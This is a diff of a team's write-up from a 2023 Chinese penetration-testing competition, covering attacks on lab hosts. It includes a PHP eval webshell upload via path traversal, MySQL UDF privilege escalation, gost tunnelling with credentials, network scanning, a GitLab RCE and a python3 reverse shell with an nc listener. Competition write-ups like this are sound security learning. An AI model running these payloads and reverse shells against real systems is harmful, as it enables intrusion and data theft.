@@ -1,735 +1,294 @@
-<!DOCTYPE html>
-<html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=55172&amp;path=livereload" data-no-instant defer></script>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>2023 贵阳大数据网络安全精英对抗赛 SU Writeup - su-team</title>
-
-<meta name="description" content="本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了 4th 的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。
-">
-<meta name="author" content="SUer">
-<link rel="icon" href="/img/SU.jpg" type="image/x-icon">
-<meta name="generator" content="Hugo 0.163.1">
-<link rel="alternate" href="http://localhost:55172/index.xml" type="application/rss+xml" title="su-team">
-
-<script>
-(function() {
-  var theme;
-  try { theme = localStorage.getItem('theme'); } catch(e) {}
-  if (!theme) {
-    theme = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-  }
-  document.documentElement.setAttribute('data-theme', theme);
-})();
-</script>
-<link rel="stylesheet" href="/css/katex.min.css">
-
-
-
-<link rel="stylesheet" href="/css/main.css">
-
-<link rel="stylesheet" href="/css/syntax.css">
-<link rel="stylesheet" href="/css/photoswipe.min.css">
-<link rel="stylesheet" href="/css/photoswipe.default-skin.min.css">
-
-</head>
-<body>
-  <header class="site-header">
-  <div class="site-header__inner">
-    <a class="site-header__logo" href="/">
-      
-          <img src="/img/SU.jpg" alt="su-team" class="site-header__logo-img">
-        
-      
-      <span class="site-header__title">su-team</span>
-    </a>
-
-    <div class="site-header__right">
-      <nav class="site-nav" role="navigation">
-        <ul class="site-nav__list">
-          
-            
-              <li class="site-nav__item">
-                <a class="site-nav__link" href="/page/archives/">Archives</a>
-              </li>
-            
-          
-            
-              <li class="site-nav__item site-nav__item--dropdown">
-                <button class="site-nav__link site-nav__link--parent" aria-haspopup="true" aria-expanded="false">
-                  Members
-                  <svg class="site-nav__chevron" width="10" height="6" viewBox="0 0 10 6" fill="none">
-                    <path d="M1 1L5 5L9 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-                  </svg>
-                </button>
-                <ul class="site-nav__dropdown">
-                  
-                    <li><a class="site-nav__dropdown-link" href="/page/active-members/">Members</a></li>
-                  
-                    <li><a class="site-nav__dropdown-link" href="/page/pioneers/">Pioneers</a></li>
-                  
-                </ul>
-              </li>
-            
-          
-            
-              <li class="site-nav__item">
-                <a class="site-nav__link" href="/page/about/">About</a>
-              </li>
-            
-          
-            
-              <li class="site-nav__item">
-                <a class="site-nav__link" href="/tags">Tags</a>
-              </li>
-            
-          
-        </ul>
-      </nav>
-
-      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
-        <svg class="theme-toggle__moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/>
-        </svg>
-        <svg class="theme-toggle__sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
-        </svg>
-      </button>
-
-      <button class="site-header__menu-btn" aria-label="Toggle menu" aria-expanded="false">
-        <span></span>
-        <span></span>
-        <span></span>
-      </button>
-    </div>
-  </div>
-</header>
-
-<script>
-(function() {
-  var toggle = document.getElementById('theme-toggle');
-  if (toggle) {
-    toggle.addEventListener('click', function() {
-      var current = document.documentElement.getAttribute('data-theme');
-      var next = current === 'dark' ? 'light' : 'dark';
-      document.documentElement.setAttribute('data-theme', next);
-      try { localStorage.setItem('theme', next); } catch(e) {}
-    });
-  }
-
-  var btn = document.querySelector('.site-header__menu-btn');
-  var nav = document.querySelector('.site-nav');
-  if (btn && nav) {
-    btn.addEventListener('click', function() {
-      var expanded = btn.getAttribute('aria-expanded') === 'true';
-      btn.setAttribute('aria-expanded', !expanded);
-      nav.classList.toggle('site-nav--open');
-      btn.classList.toggle('site-header__menu-btn--open');
-    });
-  }
-
-  var dropdownBtns = document.querySelectorAll('.site-nav__link--parent');
-  for (var i = 0; i < dropdownBtns.length; i++) {
-    dropdownBtns[i].addEventListener('click', function(e) {
-      e.preventDefault();
-      var item = this.parentNode;
-      var expanded = this.getAttribute('aria-expanded') === 'true';
-      this.setAttribute('aria-expanded', !expanded);
-      item.classList.toggle('site-nav__item--open');
-    });
-  }
-
-  document.addEventListener('click', function(e) {
-    if (!e.target.closest('.site-nav__item--dropdown')) {
-      var items = document.querySelectorAll('.site-nav__item--open');
-      for (var j = 0; j < items.length; j++) {
-        items[j].classList.remove('site-nav__item--open');
-        items[j].querySelector('.site-nav__link--parent').setAttribute('aria-expanded', 'false');
-      }
-    }
-  });
-})();
-</script>
-
-  <main>
-    
-
-
-
-
-
-
-<article class="article">
-  <header class="article__header">
-    <div class="container--article">
-      
-        <div class="article__meta">
-          <span class="post-meta">
-  <time datetime="2023-08-24">August 24, 2023</time>
-  
-    <span class="post-meta__sep">&middot;</span>
-    <span>5 min read</span>
-  
-  
-    <span class="post-meta__sep">&middot;</span>
-    <span>932 words</span>
-  
-  
-    
-  
-</span>
-
-          
-            
-              <a href="http://localhost:55172/tags/%E6%B8%97%E9%80%8F/" class="tag">渗透</a>
-            
-          
-        </div>
-      
-      <h1 class="article__title">2023 贵阳大数据网络安全精英对抗赛 SU Writeup</h1>
-      
-    </div>
-  </header>
-
-  
-  <div class="article__body">
-    <div class="article__content"><p>本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了 4th 的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。</p>
-<h2 id="2023-05-17-day1">2023 05 17 day1</h2>
-<h2 id="1dmz区">1、DMZ区</h2>
-<h3 id="入口1172303815080-bluecms">入口1：172.30.38.150:80 bluecms</h3>
-<p>bluecms后台：http://172.30.38.150/admin/
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>2023 贵阳大数据网络安全精英对抗赛 SU Writeup - su-team</title><meta name=description content="本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了 4th 的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。
+"><meta name=author content="SUer"><link rel=icon href=/img/SU.jpg type=image/x-icon><meta name=generator content="Hugo 0.163.1"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><script>(function(){var e;try{e=localStorage.getItem("theme")}catch{}e||(e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"),document.documentElement.setAttribute("data-theme",e)})()</script><link rel=stylesheet href=/css/katex.min.css><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/css/syntax.css><link rel=stylesheet href=/css/photoswipe.min.css><link rel=stylesheet href=/css/photoswipe.default-skin.min.css></head><body><header class=site-header><div class=site-header__inner><a class=site-header__logo href=/><img src=/img/SU.jpg alt=su-team class=site-header__logo-img>
+<span class=site-header__title>su-team</span></a><div class=site-header__right><nav class=site-nav role=navigation><ul class=site-nav__list><li class=site-nav__item><a class=site-nav__link href=/page/archives/>Archives</a></li><li class="site-nav__item site-nav__item--dropdown"><button class="site-nav__link site-nav__link--parent" aria-haspopup=true aria-expanded=false>
+Members
+<svg class="site-nav__chevron" width="10" height="6" viewBox="0 0 10 6" fill="none"><path d="M1 1 5 5 9 1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></button><ul class=site-nav__dropdown><li><a class=site-nav__dropdown-link href=/page/active-members/>Members</a></li><li><a class=site-nav__dropdown-link href=/page/pioneers/>Pioneers</a></li></ul></li><li class=site-nav__item><a class=site-nav__link href=/page/about/>About</a></li><li class=site-nav__item><a class=site-nav__link href=/tags>Tags</a></li></ul></nav><button class=theme-toggle id=theme-toggle aria-label="Toggle theme">
+<svg class="theme-toggle__moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-toggle__sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+<button class=site-header__menu-btn aria-label="Toggle menu" aria-expanded=false>
+<span></span>
+<span></span>
+<span></span></button></div></div></header><script>(function(){var e,t,n,s,o=document.getElementById("theme-toggle");o&&o.addEventListener("click",function(){var t=document.documentElement.getAttribute("data-theme"),e=t==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",e);try{localStorage.setItem("theme",e)}catch{}}),e=document.querySelector(".site-header__menu-btn"),n=document.querySelector(".site-nav"),e&&n&&e.addEventListener("click",function(){var t=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",!t),n.classList.toggle("site-nav--open"),e.classList.toggle("site-header__menu-btn--open")});for(s=document.querySelectorAll(".site-nav__link--parent"),t=0;t<s.length;t++)s[t].addEventListener("click",function(e){e.preventDefault();var t=this.parentNode,n=this.getAttribute("aria-expanded")==="true";this.setAttribute("aria-expanded",!n),t.classList.toggle("site-nav__item--open")});document.addEventListener("click",function(e){if(!e.target.closest(".site-nav__item--dropdown"))for(var n=document.querySelectorAll(".site-nav__item--open"),t=0;t<n.length;t++)n[t].classList.remove("site-nav__item--open"),n[t].querySelector(".site-nav__link--parent").setAttribute("aria-expanded","false")})})()</script><main><article class=article><header class=article__header><div class=container--article><div class=article__meta><span class=post-meta><time datetime=2023-08-24>August 24, 2023</time>
+<span class=post-meta__sep>&#183;</span>
+<span>5 min read</span>
+<span class=post-meta__sep>&#183;</span>
+<span>932 words</span>
+</span><a href=https://su-team.cn/tags/%E6%B8%97%E9%80%8F/ class=tag>渗透</a></div><h1 class=article__title>2023 贵阳大数据网络安全精英对抗赛 SU Writeup</h1></div></header><div class=article__body><div class=article__content><p>本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了 4th 的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。</p><h2 id=2023-05-17-day1>2023 05 17 day1</h2><h2 id=1dmz区>1、DMZ区</h2><h3 id=入口1172303815080-bluecms>入口1：172.30.38.150:80 bluecms</h3><p>bluecms后台：http://172.30.38.150/admin/
 账号密码 admin admin666
-后台系统管理-&gt;模板管理处获编译htm文件，修改为php，burp包如下</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /admin/tpl_manage.php HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: 172.30.38.150
-</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
-</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
-</span></span><span class="line"><span class="cl">Content-Length: 108
-</span></span><span class="line"><span class="cl">Origin: http://172.30.38.150
-</span></span><span class="line"><span class="cl">Connection: close
-</span></span><span class="line"><span class="cl">Referer: http://172.30.38.150/admin/tpl_manage.php?act=edit&amp;tpl_name=search.htm
-</span></span><span class="line"><span class="cl">Cookie: PHPSESSID=rkiacm3stpb4c9vpj0cp8cfo67
-</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">tpl_content=%3C%3Fphp+echo+123%3B%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E&amp;tpl_name=../shell.php&amp;act=do_edit
-</span></span></code></pre></div><p>获取权限，蚁剑连接，根目录下有flag.txt</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{9130db0c-c67b-4cee-a9a1-a79c34efc079}
-</span></span></code></pre></div><p>同时找/var/www/html/data/config.php看到了关于数据库账号密码相关信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$dbhost   = &#34;127.0.0.1&#34;; //dmz-db
-</span></span><span class="line"><span class="cl">$dbname   = &#34;bluecms&#34;;
-</span></span><span class="line"><span class="cl">$dbuser   = &#34;root&#34;;
-</span></span><span class="line"><span class="cl">$dbpass   = &#34;root&#34;; // root-gzdb123
-</span></span></code></pre></div><p>但是这里的数据库是本地的，我们第二个靶标与该ip并不是一个，但是既然给了hint，猜测是同一个密码</p>
-<h3 id="入口217230381513306">入口2：172.30.38.151:3306</h3>
-<p>根据入口1获取的数据库的密码，连接上了数据库，但是数据库中没有数据，尝试提权，试了几种发现udf可以，在国光师傅的博客 <a href="https://sqlsec.com/udf/">https://sqlsec.com/udf/</a>
-
+后台系统管理->模板管理处获编译htm文件，修改为php，burp包如下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /admin/tpl_manage.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 172.30.38.150
+</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Content-Length: 108
+</span></span><span class=line><span class=cl>Origin: http://172.30.38.150
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Referer: http://172.30.38.150/admin/tpl_manage.php?act=edit&amp;tpl_name=search.htm
+</span></span><span class=line><span class=cl>Cookie: PHPSESSID=rkiacm3stpb4c9vpj0cp8cfo67
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>tpl_content=%3C%3Fphp+echo+123%3B%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E&amp;tpl_name=../shell.php&amp;act=do_edit
+</span></span></code></pre></div><p>获取权限，蚁剑连接，根目录下有flag.txt</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>flag{9130db0c-c67b-4cee-a9a1-a79c34efc079}
+</span></span></code></pre></div><p>同时找/var/www/html/data/config.php看到了关于数据库账号密码相关信息</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$dbhost   = &#34;127.0.0.1&#34;; //dmz-db
+</span></span><span class=line><span class=cl>$dbname   = &#34;bluecms&#34;;
+</span></span><span class=line><span class=cl>$dbuser   = &#34;root&#34;;
+</span></span><span class=line><span class=cl>$dbpass   = &#34;root&#34;; // root-gzdb123
+</span></span></code></pre></div><p>但是这里的数据库是本地的，我们第二个靶标与该ip并不是一个，但是既然给了hint，猜测是同一个密码</p><h3 id=入口217230381513306>入口2：172.30.38.151:3306</h3><p>根据入口1获取的数据库的密码，连接上了数据库，但是数据库中没有数据，尝试提权，试了几种发现udf可以，在国光师傅的博客 <a href=https://sqlsec.com/udf/>https://sqlsec.com/udf/</a>
 上复制dll的exp下来，然后执行命令获取权限，整体过程如下
-hex太大 这里缩写为0x4d5a900003&hellip;.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; select @@plugin_dir;
-</span></span><span class="line"><span class="cl">+----------------------------------------------------+
-</span></span><span class="line"><span class="cl">| @@plugin_dir                                       |
-</span></span><span class="line"><span class="cl">+----------------------------------------------------+
-</span></span><span class="line"><span class="cl">| C:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\ |
-</span></span><span class="line"><span class="cl">+----------------------------------------------------+
-</span></span><span class="line"><span class="cl">1 row in set (0.003 sec)
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; SELECT 0x4d5a900003 INTO DUMPFILE &#39;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\\plugin\\udf.dll&#39;;
-</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; create function sys_eval returns string soname &#39;udf.dll&#39;;
-</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; select sys_eval(&#34;whoami&#34;);
-</span></span><span class="line"><span class="cl">+---------------------+
-</span></span><span class="line"><span class="cl">| sys_eval(&#34;whoami&#34;)  |
-</span></span><span class="line"><span class="cl">+---------------------+
-</span></span><span class="line"><span class="cl">| nt authority\system |
-</span></span><span class="line"><span class="cl">+---------------------+
-</span></span><span class="line"><span class="cl">1 row in set (0.042 sec)
-</span></span><span class="line"><span class="cl">然后一步步翻flag
-</span></span><span class="line"><span class="cl">MySQL [(none)]&gt; select sys_eval(&#39;type C:\\users\\Administrator\\Desktop\\flag.txt&#39;);
-</span></span><span class="line"><span class="cl">+--------------------------------------------------------------+
-</span></span><span class="line"><span class="cl">| sys_eval(&#39;type C:\\users\\Administrator\\Desktop\\flag.txt&#39;) |
-</span></span><span class="line"><span class="cl">+--------------------------------------------------------------+
-</span></span><span class="line"><span class="cl">| flag{522a6ec2-b101-4bae-b2fd-3e0582096a37                    |
-</span></span><span class="line"><span class="cl">+--------------------------------------------------------------+
-</span></span><span class="line"><span class="cl">1 row in set (0.030 sec)
-</span></span></code></pre></div><h2 id="2内网区">2、内网区</h2>
-<p>DMZ区拿下了一台linux 一台windows ，选择用linux挂代理</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">linux:
-</span></span><span class="line"><span class="cl">./gost -L=socks5://:7777
-</span></span><span class="line"><span class="cl">./gost -L rtcp://0.0.0.0:8888/localhost:7777 -F forward+ssh://admin:123456@172.30.38.201:9898?ping=30
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">本地：
-</span></span><span class="line"><span class="cl">gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898
-</span></span><span class="line"><span class="cl">本地的8888就是内网区的代理了
-</span></span></code></pre></div><h3 id="内网区gitlab19216820198080">内网区gitlab:192.168.20.19:8080</h3>
-<p>先fscan扫描
+hex太大 这里缩写为0x4d5a900003&mldr;.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>MySQL [(none)]&gt; select @@plugin_dir;
+</span></span><span class=line><span class=cl>+----------------------------------------------------+
+</span></span><span class=line><span class=cl>| @@plugin_dir                                       |
+</span></span><span class=line><span class=cl>+----------------------------------------------------+
+</span></span><span class=line><span class=cl>| C:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\ |
+</span></span><span class=line><span class=cl>+----------------------------------------------------+
+</span></span><span class=line><span class=cl>1 row in set (0.003 sec)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>MySQL [(none)]&gt; SELECT 0x4d5a900003 INTO DUMPFILE &#39;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\\plugin\\udf.dll&#39;;
+</span></span><span class=line><span class=cl>MySQL [(none)]&gt; create function sys_eval returns string soname &#39;udf.dll&#39;;
+</span></span><span class=line><span class=cl>MySQL [(none)]&gt; select sys_eval(&#34;whoami&#34;);
+</span></span><span class=line><span class=cl>+---------------------+
+</span></span><span class=line><span class=cl>| sys_eval(&#34;whoami&#34;)  |
+</span></span><span class=line><span class=cl>+---------------------+
+</span></span><span class=line><span class=cl>| nt authority\system |
+</span></span><span class=line><span class=cl>+---------------------+
+</span></span><span class=line><span class=cl>1 row in set (0.042 sec)
+</span></span><span class=line><span class=cl>然后一步步翻flag
+</span></span><span class=line><span class=cl>MySQL [(none)]&gt; select sys_eval(&#39;type C:\\users\\Administrator\\Desktop\\flag.txt&#39;);
+</span></span><span class=line><span class=cl>+--------------------------------------------------------------+
+</span></span><span class=line><span class=cl>| sys_eval(&#39;type C:\\users\\Administrator\\Desktop\\flag.txt&#39;) |
+</span></span><span class=line><span class=cl>+--------------------------------------------------------------+
+</span></span><span class=line><span class=cl>| flag{522a6ec2-b101-4bae-b2fd-3e0582096a37                    |
+</span></span><span class=line><span class=cl>+--------------------------------------------------------------+
+</span></span><span class=line><span class=cl>1 row in set (0.030 sec)
+</span></span></code></pre></div><h2 id=2内网区>2、内网区</h2><p>DMZ区拿下了一台linux 一台windows ，选择用linux挂代理</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>linux:
+</span></span><span class=line><span class=cl>./gost -L=socks5://:7777
+</span></span><span class=line><span class=cl>./gost -L rtcp://0.0.0.0:8888/localhost:7777 -F forward+ssh://admin:123456@172.30.38.201:9898?ping=30
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>本地：
+</span></span><span class=line><span class=cl>gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898
+</span></span><span class=line><span class=cl>本地的8888就是内网区的代理了
+</span></span></code></pre></div><h3 id=内网区gitlab19216820198080>内网区gitlab:192.168.20.19:8080</h3><p>先fscan扫描
 <code>./fscan -h 192.168.0.0/16</code>
-网络有点卡，等了一会发现除了DMZ区外只有一个内网服务器</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.20.19:8080 open
-</span></span><span class="line"><span class="cl">192.168.20.19:22 open
-</span></span><span class="line"><span class="cl">[*] WebTitle:http://192.168.20.19:8080 code:302 len:105    title:None
-</span></span><span class="line"><span class="cl">[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17     title:Sign in · GitLab
-</span></span><span class="line"><span class="cl">[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab] 
-</span></span><span class="line"><span class="cl">[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak
+网络有点卡，等了一会发现除了DMZ区外只有一个内网服务器</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>192.168.20.19:8080 open
+</span></span><span class=line><span class=cl>192.168.20.19:22 open
+</span></span><span class=line><span class=cl>[*] WebTitle:http://192.168.20.19:8080 code:302 len:105    title:None
+</span></span><span class=line><span class=cl>[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17     title:Sign in · GitLab
+</span></span><span class=line><span class=cl>[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab] 
+</span></span><span class=line><span class=cl>[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak
 </span></span></code></pre></div><p>网站找gitlab前台rce漏洞，分析了一下，cve-2021-22205可用，github找一个exp打，这里很蛋疼，这个poc是无回显的，而且gitlab不太方便做权限维持（不是php写的），尝试反弹shell，但是内网区是不通本地的ip，只有DMZ区通。
-所以我使用的方法是</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、先将dmz区的linux反弹shell到本地获取一个交互式dmz区的shell
-</span></span><span class="line"><span class="cl">这个dmz区反弹一直报错，最后使用python3反弹的
-</span></span><span class="line"><span class="cl">python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.10.10&#34;,9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39;
-</span></span><span class="line"><span class="cl">2、在交互式dmz区的shell上 监听nc -lnvp 9090
-</span></span><span class="line"><span class="cl">3、用gitlab的exp 反弹shell到dmz的ip（192.168.10.10）
-</span></span></code></pre></div><p>获取了git的权限，flag在根目录</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git@60783d084846:~/gitlab$ cat /flag.txt
-</span></span><span class="line"><span class="cl">flag{b10785ca-a4ff-4cb9-a6d5-50351c248ee3}
-</span></span></code></pre></div><h3 id="内网区windows1921682015">内网区windows:192.168.20.15</h3>
-<p>fscan开多了，所以没扫到其他资产，试了很久。然后把fscan进程一个个杀了，降低线程+重新跑了一下20+取消ping。
-发现了另外一个资产</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mf">192.168.20.19</span><span class="p">:</span><span class="mi">22</span> <span class="nb">open</span>
-</span></span><span class="line"><span class="cl"><span class="mf">192.168.20.15</span><span class="p">:</span><span class="mi">135</span> <span class="nb">open</span>
-</span></span><span class="line"><span class="cl"><span class="mf">192.168.20.15</span><span class="p">:</span><span class="mi">139</span> <span class="nb">open</span>
-</span></span><span class="line"><span class="cl"><span class="mf">192.168.20.15</span><span class="p">:</span><span class="mi">445</span> <span class="nb">open</span>
-</span></span><span class="line"><span class="cl"><span class="mf">192.168.20.19</span><span class="p">:</span><span class="mi">8080</span> <span class="nb">open</span>
-</span></span><span class="line"><span class="cl"><span class="mf">192.168.20.15</span><span class="p">:</span><span class="mi">88</span> <span class="nb">open</span>
-</span></span><span class="line"><span class="cl"><span class="n">NetInfo</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="mf">192.168.20.15</span>
-</span></span><span class="line"><span class="cl">   <span class="p">[</span><span class="o">-&gt;</span><span class="p">]</span><span class="n">DC</span>
-</span></span><span class="line"><span class="cl">   <span class="p">[</span><span class="o">-&gt;</span><span class="p">]</span><span class="mf">192.168.20.15</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168.20.15</span>  <span class="p">(</span><span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2012</span> <span class="n">R2</span> <span class="n">Datacenter</span> <span class="mi">9600</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">192.168.20.15</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="n">DC</span> <span class="n">COMPANY</span>\<span class="n">DC</span>                <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2012</span> <span class="n">R2</span> <span class="n">Datacenter</span> <span class="mi">9600</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span><span class="p">:</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.20.19</span><span class="p">:</span><span class="mi">8080</span> <span class="n">code</span><span class="p">:</span><span class="mi">302</span> <span class="nb">len</span><span class="p">:</span><span class="mi">105</span>    <span class="n">title</span><span class="p">:</span><span class="kc">None</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">WebTitle</span><span class="p">:</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.20.19</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">sign_in</span> <span class="n">code</span><span class="p">:</span><span class="mi">200</span> <span class="nb">len</span><span class="p">:</span><span class="mi">17</span>     <span class="n">title</span><span class="p">:</span><span class="n">Sign</span> <span class="ow">in</span> <span class="err">·</span> <span class="n">GitLab</span>
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">InfoScan</span><span class="p">:</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.20.19</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">sign_in</span> <span class="p">[</span><span class="n">GitLab</span><span class="p">]</span> 
-</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.20.19</span><span class="p">:</span><span class="mi">8080</span> <span class="n">poc</span><span class="o">-</span><span class="n">yaml</span><span class="o">-</span><span class="n">gitlab</span><span class="o">-</span><span class="n">cnvd</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">14193</span><span class="o">-</span><span class="n">infoleak</span>
+所以我使用的方法是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1、先将dmz区的linux反弹shell到本地获取一个交互式dmz区的shell
+</span></span><span class=line><span class=cl>这个dmz区反弹一直报错，最后使用python3反弹的
